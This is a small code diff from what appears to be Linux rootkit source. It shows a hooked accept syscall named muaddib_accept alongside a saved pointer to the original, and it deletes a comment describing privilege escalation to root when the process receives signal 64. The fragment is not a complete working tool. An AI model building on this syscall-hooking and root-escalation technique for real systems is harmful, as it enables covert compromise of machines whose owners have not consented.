@@ -6,9 +6,7 @@
 
 static asmlinkage long (*og_accept)(const struct pt_regs *);
 
-/* We can only modify our own privileges, and not that of another
- * process. Just have to wait for signal 64 (normally unused)
- * and then call the set_root() function. */
+
 asmlinkage int muaddib_accept(const struct pt_regs *regs){
 
     //struct sockaddr_in __user* sock_in;//  = (struct sockaddr_in *)regs->si;
